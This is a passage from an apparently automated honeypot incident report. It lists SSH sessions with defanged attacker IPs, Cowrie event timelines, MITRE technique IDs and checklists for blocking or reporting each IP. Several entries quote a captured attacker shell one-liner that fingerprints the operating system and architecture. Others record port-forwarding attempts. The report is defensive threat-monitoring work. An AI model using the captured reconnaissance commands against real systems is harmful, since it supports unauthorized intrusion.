| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:12:31` | `cowrie.session.connect` |
| `2026-07-13 05:12:32` | `cowrie.client.version` |
| `2026-07-13 05:12:32` | `cowrie.client.kex` |
| `2026-07-13 05:12:35` | `cowrie.login.success` |
| `2026-07-13 05:12:38` | `cowrie.session.params` |
| `2026-07-13 05:12:38` | `cowrie.command.input` |
| `2026-07-13 05:12:38` | `cowrie.command.input` |
| `2026-07-13 05:12:38` | `cowrie.command.input` |
| `2026-07-13 05:12:38` | `cowrie.command.input` |
| `2026-07-13 05:12:38` | `cowrie.command.input` |
| `2026-07-13 05:12:38` | `cowrie.command.success` |
| `2026-07-13 05:12:38` | `cowrie.command.input` |
| `2026-07-13 05:12:38` | `cowrie.command.input` |
| `2026-07-13 05:12:38` | `cowrie.command.input` |
| `2026-07-13 05:12:38` | `cowrie.command.input` |
| `2026-07-13 05:12:39` | `cowrie.log.closed` |
| `2026-07-13 05:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5b1a91604da

| Field | Detail |
|---|---|
| **Source IP** | `125.139.124[.]120` |
| **First Seen** | 2026-07-13 05:13 |
| **Last Seen** | 2026-07-13 05:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:13:53` | `cowrie.session.connect` |
| `2026-07-13 05:13:54` | `cowrie.client.version` |
| `2026-07-13 05:13:54` | `cowrie.client.kex` |
| `2026-07-13 05:13:57` | `cowrie.login.success` |
| `2026-07-13 05:13:58` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:14:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.139.124[.]120` to AbuseIPDB if not already reported
- [ ] Block `125.139.124[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71254c017e50

| Field | Detail |
|---|---|
| **Source IP** | `61.80.161[.]172` |
| **First Seen** | 2026-07-13 05:14 |
| **Last Seen** | 2026-07-13 05:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:14:07` | `cowrie.session.connect` |
| `2026-07-13 05:14:08` | `cowrie.client.version` |
| `2026-07-13 05:14:08` | `cowrie.client.kex` |
| `2026-07-13 05:14:10` | `cowrie.login.success` |
| `2026-07-13 05:14:11` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:14:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.80.161[.]172` to AbuseIPDB if not already reported
- [ ] Block `61.80.161[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cb1963635c8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:14 |
| **Last Seen** | 2026-07-13 05:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:14:13` | `cowrie.session.connect` |
| `2026-07-13 05:14:13` | `cowrie.client.version` |
| `2026-07-13 05:14:13` | `cowrie.client.kex` |
| `2026-07-13 05:14:16` | `cowrie.login.success` |
| `2026-07-13 05:14:18` | `cowrie.session.params` |
| `2026-07-13 05:14:18` | `cowrie.command.input` |
| `2026-07-13 05:14:18` | `cowrie.command.input` |
| `2026-07-13 05:14:18` | `cowrie.command.input` |
| `2026-07-13 05:14:18` | `cowrie.command.input` |
| `2026-07-13 05:14:18` | `cowrie.command.input` |
| `2026-07-13 05:14:18` | `cowrie.command.success` |
| `2026-07-13 05:14:18` | `cowrie.command.input` |
| `2026-07-13 05:14:18` | `cowrie.command.input` |
| `2026-07-13 05:14:18` | `cowrie.command.input` |
| `2026-07-13 05:14:18` | `cowrie.command.input` |
| `2026-07-13 05:14:18` | `cowrie.log.closed` |
| `2026-07-13 05:14:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7ea4a546963

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:16 |
| **Last Seen** | 2026-07-13 05:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:16:08` | `cowrie.session.connect` |
| `2026-07-13 05:16:08` | `cowrie.client.version` |
| `2026-07-13 05:16:08` | `cowrie.client.kex` |
| `2026-07-13 05:16:10` | `cowrie.login.success` |
| `2026-07-13 05:16:11` | `cowrie.session.params` |
| `2026-07-13 05:16:11` | `cowrie.command.input` |
| `2026-07-13 05:16:11` | `cowrie.command.input` |
| `2026-07-13 05:16:11` | `cowrie.command.input` |
| `2026-07-13 05:16:11` | `cowrie.command.input` |
| `2026-07-13 05:16:11` | `cowrie.command.input` |
| `2026-07-13 05:16:11` | `cowrie.command.success` |
| `2026-07-13 05:16:11` | `cowrie.command.input` |
| `2026-07-13 05:16:11` | `cowrie.command.input` |
| `2026-07-13 05:16:11` | `cowrie.command.input` |
| `2026-07-13 05:16:11` | `cowrie.command.input` |
| `2026-07-13 05:16:12` | `cowrie.log.closed` |
| `2026-07-13 05:16:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e11d0502bc45

| Field | Detail |
|---|---|
| **Source IP** | `213.154.80[.]51` |
| **First Seen** | 2026-07-13 05:17 |
| **Last Seen** | 2026-07-13 05:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:17:41` | `cowrie.session.connect` |
| `2026-07-13 05:17:41` | `cowrie.client.version` |
| `2026-07-13 05:17:41` | `cowrie.client.kex` |
| `2026-07-13 05:17:43` | `cowrie.login.success` |
| `2026-07-13 05:17:43` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.154.80[.]51` to AbuseIPDB if not already reported
- [ ] Block `213.154.80[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9744a0a83da9

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 05:19 |
| **Last Seen** | 2026-07-13 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:19:04` | `cowrie.session.connect` |
| `2026-07-13 05:19:04` | `cowrie.client.version` |
| `2026-07-13 05:19:04` | `cowrie.client.kex` |
| `2026-07-13 05:19:04` | `cowrie.login.success` |
| `2026-07-13 05:19:05` | `cowrie.session.params` |
| `2026-07-13 05:19:05` | `cowrie.command.input` |
| `2026-07-13 05:19:05` | `cowrie.log.closed` |
| `2026-07-13 05:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b5c3d4a1d3c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:19 |
| **Last Seen** | 2026-07-13 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:19:11` | `cowrie.session.connect` |
| `2026-07-13 05:19:11` | `cowrie.client.version` |
| `2026-07-13 05:19:11` | `cowrie.client.kex` |
| `2026-07-13 05:19:12` | `cowrie.login.success` |
| `2026-07-13 05:19:13` | `cowrie.session.params` |
| `2026-07-13 05:19:13` | `cowrie.command.input` |
| `2026-07-13 05:19:13` | `cowrie.command.input` |
| `2026-07-13 05:19:13` | `cowrie.command.input` |
| `2026-07-13 05:19:13` | `cowrie.command.input` |
| `2026-07-13 05:19:13` | `cowrie.command.input` |
| `2026-07-13 05:19:13` | `cowrie.command.success` |
| `2026-07-13 05:19:13` | `cowrie.command.input` |
| `2026-07-13 05:19:13` | `cowrie.command.input` |
| `2026-07-13 05:19:13` | `cowrie.command.input` |
| `2026-07-13 05:19:13` | `cowrie.command.input` |
| `2026-07-13 05:19:13` | `cowrie.log.closed` |
| `2026-07-13 05:19:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b0479d711b6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:22 |
| **Last Seen** | 2026-07-13 05:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:22:10` | `cowrie.session.connect` |
| `2026-07-13 05:22:10` | `cowrie.client.version` |
| `2026-07-13 05:22:10` | `cowrie.client.kex` |
| `2026-07-13 05:22:11` | `cowrie.login.success` |
| `2026-07-13 05:22:13` | `cowrie.session.params` |
| `2026-07-13 05:22:13` | `cowrie.command.input` |
| `2026-07-13 05:22:13` | `cowrie.command.input` |
| `2026-07-13 05:22:13` | `cowrie.command.input` |
| `2026-07-13 05:22:13` | `cowrie.command.input` |
| `2026-07-13 05:22:13` | `cowrie.command.input` |
| `2026-07-13 05:22:13` | `cowrie.command.success` |
| `2026-07-13 05:22:13` | `cowrie.command.input` |
| `2026-07-13 05:22:13` | `cowrie.command.input` |
| `2026-07-13 05:22:13` | `cowrie.command.input` |
| `2026-07-13 05:22:13` | `cowrie.command.input` |
| `2026-07-13 05:22:13` | `cowrie.log.closed` |
| `2026-07-13 05:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c353e2cb936

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:24 |
| **Last Seen** | 2026-07-13 05:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:24:02` | `cowrie.session.connect` |
| `2026-07-13 05:24:02` | `cowrie.client.version` |
| `2026-07-13 05:24:02` | `cowrie.client.kex` |
| `2026-07-13 05:24:05` | `cowrie.login.success` |
| `2026-07-13 05:24:06` | `cowrie.session.params` |
| `2026-07-13 05:24:06` | `cowrie.command.input` |
| `2026-07-13 05:24:06` | `cowrie.command.input` |
| `2026-07-13 05:24:06` | `cowrie.command.input` |
| `2026-07-13 05:24:06` | `cowrie.command.input` |
| `2026-07-13 05:24:06` | `cowrie.command.input` |
| `2026-07-13 05:24:06` | `cowrie.command.success` |
| `2026-07-13 05:24:06` | `cowrie.command.input` |
| `2026-07-13 05:24:06` | `cowrie.command.input` |
| `2026-07-13 05:24:06` | `cowrie.command.input` |
| `2026-07-13 05:24:06` | `cowrie.command.input` |
| `2026-07-13 05:24:07` | `cowrie.log.closed` |
| `2026-07-13 05:24:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25bdeeedbb63

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:27 |
| **Last Seen** | 2026-07-13 05:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:27:35` | `cowrie.session.connect` |
| `2026-07-13 05:27:36` | `cowrie.client.version` |
| `2026-07-13 05:27:36` | `cowrie.client.kex` |
| `2026-07-13 05:27:38` | `cowrie.login.success` |
| `2026-07-13 05:27:39` | `cowrie.session.params` |
| `2026-07-13 05:27:39` | `cowrie.command.input` |
| `2026-07-13 05:27:39` | `cowrie.command.input` |
| `2026-07-13 05:27:39` | `cowrie.command.input` |
| `2026-07-13 05:27:39` | `cowrie.command.input` |
| `2026-07-13 05:27:39` | `cowrie.command.input` |
| `2026-07-13 05:27:39` | `cowrie.command.success` |
| `2026-07-13 05:27:39` | `cowrie.command.input` |
| `2026-07-13 05:27:39` | `cowrie.command.input` |
| `2026-07-13 05:27:39` | `cowrie.command.input` |
| `2026-07-13 05:27:39` | `cowrie.command.input` |
| `2026-07-13 05:27:40` | `cowrie.log.closed` |
| `2026-07-13 05:27:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce9eea325364

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-13 05:28 |
| **Last Seen** | 2026-07-13 05:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:28:38` | `cowrie.session.connect` |
| `2026-07-13 05:28:38` | `cowrie.client.version` |
| `2026-07-13 05:28:38` | `cowrie.client.kex` |
| `2026-07-13 05:28:38` | `cowrie.login.success` |
| `2026-07-13 05:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbf146c79c1b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-13 05:28 |
| **Last Seen** | 2026-07-13 05:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:28:40` | `cowrie.session.connect` |
| `2026-07-13 05:28:40` | `cowrie.client.version` |
| `2026-07-13 05:28:40` | `cowrie.client.kex` |
| `2026-07-13 05:28:40` | `cowrie.login.success` |
| `2026-07-13 05:28:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd344aa36979

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-13 05:28 |
| **Last Seen** | 2026-07-13 05:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:28:44` | `cowrie.session.connect` |
| `2026-07-13 05:28:44` | `cowrie.client.version` |
| `2026-07-13 05:28:44` | `cowrie.client.kex` |
| `2026-07-13 05:28:44` | `cowrie.login.success` |
| `2026-07-13 05:28:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-901ad164d882

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-13 05:28 |
| **Last Seen** | 2026-07-13 05:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:28:44` | `cowrie.session.connect` |
| `2026-07-13 05:28:44` | `cowrie.client.version` |
| `2026-07-13 05:28:44` | `cowrie.client.kex` |
| `2026-07-13 05:28:44` | `cowrie.login.success` |
| `2026-07-13 05:28:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a93c9869a5fc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:29 |
| **Last Seen** | 2026-07-13 05:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:29:23` | `cowrie.session.connect` |
| `2026-07-13 05:29:24` | `cowrie.client.version` |
| `2026-07-13 05:29:24` | `cowrie.client.kex` |
| `2026-07-13 05:29:28` | `cowrie.login.success` |
| `2026-07-13 05:29:29` | `cowrie.session.params` |
| `2026-07-13 05:29:29` | `cowrie.command.input` |
| `2026-07-13 05:29:29` | `cowrie.command.input` |
| `2026-07-13 05:29:29` | `cowrie.command.input` |
| `2026-07-13 05:29:29` | `cowrie.command.input` |
| `2026-07-13 05:29:29` | `cowrie.command.input` |
| `2026-07-13 05:29:29` | `cowrie.command.success` |
| `2026-07-13 05:29:29` | `cowrie.command.input` |
| `2026-07-13 05:29:29` | `cowrie.command.input` |
| `2026-07-13 05:29:29` | `cowrie.command.input` |
| `2026-07-13 05:29:29` | `cowrie.command.input` |
| `2026-07-13 05:29:30` | `cowrie.log.closed` |
| `2026-07-13 05:29:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a4397a43939

| Field | Detail |
|---|---|
| **Source IP** | `117.248.201[.]39` |
| **First Seen** | 2026-07-13 05:30 |
| **Last Seen** | 2026-07-13 05:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:30:01` | `cowrie.session.connect` |
| `2026-07-13 05:30:02` | `cowrie.client.version` |
| `2026-07-13 05:30:02` | `cowrie.client.kex` |
| `2026-07-13 05:30:04` | `cowrie.login.success` |
| `2026-07-13 05:30:05` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:30:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.248.201[.]39` to AbuseIPDB if not already reported
- [ ] Block `117.248.201[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e5025d6216b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:31 |
| **Last Seen** | 2026-07-13 05:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
